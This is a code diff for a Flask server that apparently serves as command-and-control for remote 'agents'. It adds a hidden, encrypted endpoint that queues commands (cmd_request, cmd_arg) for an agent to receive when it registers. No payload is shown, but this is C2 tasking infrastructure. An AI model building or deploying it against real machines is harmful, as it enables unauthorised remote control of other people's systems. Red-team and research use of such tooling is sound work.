@@ -5,6 +5,7 @@ from flask_login import login_required
 import json
 from . import db, config, decrypt, encrypt
 from .models import Task
+from .models import OnRegisteringTask
 import uuid
 from datetime import datetime
 
@@ -47,6 +48,40 @@ def create_task(agent_uid):
             return encrypt("[-] Cannot create the task: " + task_uid + " for the agent: " + agent_uid)
         
     print("[*] Task created: " + task_uid + " for agent: " + agent_uid)
+
+    return encrypt(task_uid)
+
+# create on registering task
+@task.route(config["hidden_route"] + config["endpoints"]["registering_task"] + "/<path:agent_name>", methods=['POST'])
+@login_required
+def create_registering_task(agent_name):  
+    try:
+        content = request.data
+        d = decrypt(content)
+    except Exception as e:
+        print("[-] Error in create_registering_task()")
+        print(str(e))
+        return encrypt("[-] Cannot decrypt the request")
+    
+    d = json.loads(d)
+
+    task_uid = str(uuid.uuid4())
+    today = datetime.now()
+    task_created_at = today.strftime("%d/%m/%Y - %H:%M")   
+    cmd_request = d["cmd_request"]
+    cmd_arg = d["cmd_arg"]
+
+    new_task = OnRegisteringTask(task_uid=task_uid, task_created_at=task_created_at, agent_name=agent_name, cmd_request=cmd_request, cmd_arg=cmd_arg)
+    try:
+        db.session.add(new_task)
+        db.session.commit()
+    except Exception as e:
+            print("[-] Error in create_registering_task()")
+            print("[-] Cannot create a new 'on registering task'")
+            print(str(e))
+            return encrypt("[-] Cannot create the 'on registering task': " + task_uid + " for the agent_name: " + agent_name)
+        
+    print("[*] On registering task created: " + task_uid + " for agent name: " + agent_name)
 
     return encrypt(task_uid)
 
